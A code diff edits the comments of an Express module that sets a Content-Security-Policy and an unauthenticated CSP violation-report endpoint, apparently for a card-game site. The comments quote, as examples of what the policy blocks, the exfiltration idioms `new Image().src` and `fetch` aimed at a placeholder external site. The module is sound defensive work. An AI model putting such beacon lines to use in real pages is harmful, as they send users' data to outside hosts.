@@ -3,7 +3,7 @@
 // 浏览器安全策略（Content-Security-Policy）+ 违规上报（2026-11-14）。
 //
 // 🔴 为什么要有：注入进页面的代码偷数据，靠的几乎都是
-//    `new Image().src = 'https://外站/…?d=底牌'` 或 `fetch('https://外站/…')` 把数据送出去的。
+//    `new Image().src = 'https://外站/…?d=…'` 或 `fetch('https://外站/…')`。
 //    这里规定「图片、网络请求只准走本站」之后，同样的代码就算混进页面，数据也送不出去。
 //    它是第二道防线：第一道是「拼进 HTML 的数据一律转义」（tools/check-escape.js）。
 //
@@ -46,8 +46,7 @@ function registerSecurityHeaders({ app, express, clientErrors, extractIp }) {
         next();
     });
 
-    // 浏览器拦下一次违规就会往这里报一条。有人试的话会被记下来 ——
-    // 这次要是再有人试，管理面板「客户端报错」里会直接看到「CSP 拦截 → 某个外站地址」。
+    // 浏览器拦下一次违规就会往这里报一条：有人试的话，管理面板「客户端报错」里会直接看到「CSP 拦截 → 某个外站地址」。
     // 和 /api/client-error 一样不鉴权、按敌对输入处理（限流 / 去重 / 截断都在 clientErrors 里）。
     const parseReport = express.json({ limit: '16kb', type: ['application/csp-report', 'application/json', 'application/reports+json'] });
     app.post('/api/csp-report', (req, res, next) => {
